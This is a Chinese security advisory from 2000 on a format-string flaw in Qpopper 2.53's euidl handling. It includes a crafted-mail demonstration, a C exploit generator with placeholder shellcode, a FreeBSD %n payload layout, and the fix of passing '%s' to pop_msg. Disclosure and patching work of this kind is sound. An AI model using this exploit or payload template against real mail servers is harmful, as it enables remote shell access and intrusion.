---
title: "通过Qpopper2.53远程获得shell"
date: 2000-05-27T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-54"
---

(quack_at_xfocus.org)

通过Qpopper2.53远程获得shell


by quack

参考：bufferoverflow secrurity advisory #5 by prizm

       

 * 简述

    Qpopper是使用相当广泛的POP3服务器，允许用户通过POP3客户端读他们的信件。

    它通常用于标准的UNIX系统里的邮件服务。

    

 * 问题

    在Qpopper2.53的版本中，QPOP的漏洞会使你远程获得一个gid=mail的shell。

    问题出在pop_msg()函数，当用户执行euidl命令时会出错，让我们检查一下Qpop

    2.53的代码吧：

    

    --> pop_uidl.c,在代码第150行处:

     ................

            sprintf(buffer, "%d %s", msg_id, mp->uidl_str);

            if (nl = index(buffer, NEWLINE)) *nl = 0;

            sprintf(buffer, "%s %d %.128s", buffer, mp->length, from_hdr(p, mp));

     !      return (pop_msg (p,POP_SUCCESS, buffer));

                                      ^^^^^^^^^^^^^

     .................

    在pop_msg.c中函数pop_msg()定义为：pop_msg(POP *p, int stat,

    const char *format,...), 这里有一个用户输入的format:)

        好了，我们想象一下下面的情况吧：


         MAIL FROM:<hakker@evil.org>

         200 Ok

         RCPT TO:<luser@host.withqpop253.com>

         200 Ok

         data

         200 Okey, okey. end with "."

         Subject: still trust qpop?=/

         X-UIDL: AAAAAAAAAAAAAAAA

         From: %p%p%p%p%p%p%p


         test

         .

         200 BLABLABLA Ok, message accepted for delivery.


      然后用户luser连接到他的pop帐号并且运行euidl命令：


        +OK QPOP (version 2.53) at b0f starting. <666.666@b0f>

        USER luser

        +OK Password required for luser.

        PASS secret

        +OK luser has 3 messages (1644 octets).

        euidl 3

        +OK 2 AAAAAAAAAAAAAAAA 530 0xbfbfc9b00x804fd740xbfbfc9b00x2120x8052e5e0xbfbfd1e80x8057028


      Yeah, thats from my box with FreeBSD. As you can see, our %p%p%p%p%p%p%p

      where implemented as arguments for vsnprintf() command.


 * 利用

         能够做到吧? 是的, 当然!

     但那有个小小的限制. Qpopper2.53运行于FreeBSD上的会比LINUX更难于利用，因为

         freebsd将pop_msg.c函数中的vsprintf()调用改成了vsnprintf()调用，两者之间有

         着显著的差别――当然也是可以利用的:)


       利用程序

       --------

/*  qpop_euidl.c exploit by prizm/Buffer0verflow Security

 *

 *  Sample exploit for buffer overflow in Qpopper 2.53.

 *  This little proggie generates a mail u need to send.

 *

 *  Standard disclaimer applies.

 *  By the way, exploit is broken =) You need to insert shellcode.

 *

 *  MAD greets to tf8 for pointing out the bug, and all other b0f members.

 *  greets to USSRLabs and ADM

 *  check [http://b0f.freebsd.lublin.pl/](http://b0f.freebsd.lublin.pl/) for news.

 */

#include <stdio.h>

#include <string.h>


char shellcode[]="imnothing";

int main(int argc, char *argv[])

{

    int i;

    unsigned long ra=0;

    if(argc!=2) {

        fprintf(stderr,"Usage: %s return_addr\n", argv[0]);

        exit(0);

    }

    sscanf(argv[1], "%x", &ra);

    if(!ra) 

         return;

    if(sizeof(shellcode) < 12 || sizeof(shellcode) > 76) {

        fprintf(stderr,"Bad shellcode\n");

        exit(0);

    }

    fprintf(stderr,"return address: 0x%.8x\n", ra);

    printf("X-UIDL: ");

    for(i=0; i < sizeof(shellcode);i++)

        printf("%c", shellcode[i]);

    printf("\r\n");

    printf("From: %s", "%.1000d");

    for(i=0; i < 50; i++) 

        printf("%c%c%c%c", (ra & 0xff), (ra & 0xff00)>>8, (ra & 0xff0000)>>16, (ra & 0xff000000)>>24);

    printf("@test\r\n");

    printf("Subject: test\r\n\r\nhuh?\r\n.\r\n");

    return 0;

}


    在FreeBSD上利用QPOP端口

    ---------------------


    这不太容易，因为函数vsprintf()已经被vsnprintf()替代了，所以我们无法造成溢出，但我们

    仍然能够控制它――记得%n么？它的原理如下：

    这里面有个利用%n的小窍门。看看下面的代码吧，能否理解为什么其输出的结果是2000,

        而不是sizeof(b):


---<cut>---

#include <stdio.h>

int main(void){

        int s=1; char b[1024]; int q;

        snprintf(b, sizeof(b), "%.2000d%n", 1, &q);

        return printf("%d, overflowed? %s\n", q, (s==1?"NO":"YES"));

}

---</cut>---


    在我的FreeBSD 3.4机器上我得到了以下结果:

    2000, overflowed? NO


    嘿，刚开始我希望能看到1024，但你知道――有时程序的运行并不容易控制，看看下面

        或许能有些帮助。


        Exploiting it:


    a) 找出用户的输入在堆栈中的精确位置。

    b) Compose a message with filed X-UIDL and From:

        X-UIDL: ppRETARETARETARETA

        From: <SHELLCODE>%.RETURNd%n@test

    其中:

    "pp"            用来填充的(二至三个字节)

    "RETA"          表示返回的SHELLCODE的地址

    "SHELLCODE"        guess

    "RETURN"        返回地址


    c) 如果你需要freebsd版本的利用程序――自己动手吧:)


 * 存在漏洞的版本

    2.53(其它呢?不确定……)

 


 * 补丁

        你可以从[http://www.eudora.com/freeware/qpop.html#CURRENT](http://www.eudora.com/freeware/qpop.html#CURRENT)下载到Qpopper 3.1的版

        本，其中这个问题已经解决。


        或者你可以自己动手修改代码：


      在pop_msg.c的150行及62行, 将:

    - return (pop_msg (p,POP_SUCCESS, buffer));

      修改为:

    + return (pop_msg (p,POP_SUCCESS, "%s", buffer));
